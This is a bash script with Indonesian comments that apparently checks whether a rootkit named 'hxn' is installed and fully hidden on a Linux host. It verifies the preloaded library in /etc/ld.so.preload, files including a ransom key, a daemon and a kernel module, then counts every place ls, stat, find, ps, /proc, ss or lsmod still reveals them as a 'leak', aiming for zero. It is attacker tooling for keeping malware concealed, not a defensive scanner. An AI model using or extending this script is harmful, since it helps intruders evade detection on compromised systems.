#!/bin/bash
# status.sh — audit senyap. tidak menulis, tidak mengubah mtime. exit 0 = tidak bocor.
set -u
H=${HXN_DIR:-/usr/lib/.hxn}; C=${HXN_CONF:-/etc/hxn.conf}
leak=0
ok(){  printf '  \e[32mOK \e[0m %s\n' "$*"; }
gap(){ printf '  \e[31mGAP\e[0m %s\n' "$*"; leak=$((leak+1)); }
hdr(){ printf '\n== %s ==\n' "$*"; }

hdr "konteks"
printf '  uid=%s arch=%s kernel=%s\n' "$(id -u)" "$(uname -m)" "$(uname -r)"
[ -f /.dockerenv ] && echo "  container: ya (kernel = host)"

hdr "artefak di $H"
if [ -d "$H" ]; then
  ls -a "$H" 2>/dev/null | tr '\n' ' '; echo
  for f in libhxn.so hxnd.py ransom_priv.pem hxn.key; do
    [ -e "$H/$f" ] && ok "$f ada" || gap "$f hilang"
  done
else gap "direktori tidak ada"; fi

hdr "preload"
if [ -s /etc/ld.so.preload ]; then
  cat /etc/ld.so.preload
  grep -qxF "$H/libhxn.so" /etc/ld.so.preload && ok "lib terdaftar" || gap "lib tidak terdaftar"
else gap "/etc/ld.so.preload kosong"; fi
LD_PRELOAD="$H/libhxn.so" ls / >/dev/null 2>&1 && ok "lib bisa dimuat" || gap "lib gagal dimuat"

hdr "visibilitas nama (target: semua hilang)"
for f in hxn hxn.ko ld.so.preload libhxn.so; do
  if ls "$H/$f" >/dev/null 2>&1 || ls "/etc/$f" >/dev/null 2>&1; then
    n=$( { ls -d "$H/$f" 2>/dev/null; ls "/etc/$f" 2>/dev/null; } | head -1 )
    [ -n "$n" ] && gap "$f terlihat lewat ls" || ok "$f tersembunyi dari ls"
  fi
done

hdr "celah statx (glibc 2.33+)"
if [ -e "$H/libhxn.so" ]; then
  if stat -c%s "$H/libhxn.so" >/dev/null 2>&1; then gap "stat melihat libhxn.so (hook statx belum ada)"
  else ok "stat buta"; fi
  if find "$H" -maxdepth 1 -name 'libhxn.so' -print -quit | grep -q .; then gap "find melihat libhxn.so"
  else ok "find buta"; fi
fi

hdr "proses"
p=$(cat "$C" 2>/dev/null | awk '/^pid /{print $2; exit}')
if [ -n "${p:-}" ] && [ -d "/proc/$p" ]; then
  cmd=$(tr '\0' ' ' < "/proc/$p/cmdline" 2>/dev/null)
  ok "daemon hidup pid $p ($cmd)"
  ps -eo pid= 2>/dev/null | grep -qw "$p" && gap "ps menampilkan pid $p" || ok "ps buta"
  ls /proc 2>/dev/null | grep -qx "$p" && gap "/proc readdir menampilkan $p" || ok "/proc readdir buta"
else gap "daemon mati atau pid di konf salah (${p:-kosong})"; fi

hdr "port (target: /proc/net/tcp buta)"
for pt in 31337 62201; do
  if grep -qi ":$(printf '%04X' "$pt")" /proc/net/tcp 2>/dev/null; then gap "/proc/net/tcp menampilkan $pt"
  else ok "/proc/net/tcp buta untuk $pt"; fi
  if command -v ss >/dev/null; then
    ss -tln 2>/dev/null | grep -q ":$pt" && gap "ss menampilkan $pt (netlink, bukan bug)" || ok "ss buta untuk $pt"
  fi
done

hdr "LKM"
if [ -e /sys/module/hxn ]; then
  ok "modul termuat"
  for f in /sys/module/hxn/parameters/hide_pid /sys/module/hxn/parameters/hide_port; do
    [ -f "$f" ] && echo "    ${f##*/} = $(cat "$f" 2>/dev/null)"
  done
  grep -q '^hxn ' /proc/modules && gap "/proc/modules menampilkan hxn" || ok "tersembunyi dari /proc/modules"
  lsmod 2>/dev/null | grep -q '^hxn ' && gap "lsmod menampilkan hxn" || ok "tersembunyi dari lsmod"
  [ -e /sys/module/hxn ] && gap "masih ada di /sys/module" || ok "/sys/module bersih"
else gap "LKM tidak termuat"; fi

hdr "konf"
[ -f "$C" ] && { echo "  $(wc -l < "$C") baris"; grep -c '^port ' "$C" | sed 's/^/  port entries: /'; } || gap "$C tidak ada"

hdr "verdict"
if [ "$leak" -eq 0 ]; then printf '  \e[32mSENYAP\e[0m — 0 kebocoran\n'; exit 0; fi
printf '  \e[31m%d KEBOCORAN\e[0m\n' "$leak"; exit 1
